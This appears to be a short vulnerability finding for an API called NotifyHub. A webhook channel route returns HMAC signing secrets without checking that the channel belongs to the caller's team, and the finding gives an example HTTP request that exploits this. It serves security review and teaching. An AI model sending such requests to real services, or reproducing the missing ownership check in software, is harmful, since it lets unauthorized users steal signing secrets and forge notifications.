diagnosis: The route handler retrieves NotificationChannel model instances from Redis OM by primary key. It returns sensitive HMAC secret tokens without validating that channel.team_id == current_user.team_id, enabling unauthorized users to obtain webhook signing secrets and forge system notifications.
exploit_request:
GET /webhooks/channels/01HJDE9012KMA89124018241B HTTP/1.1
Host: api.notifyhub.io
Authorization: Bearer <authenticated_jwt>
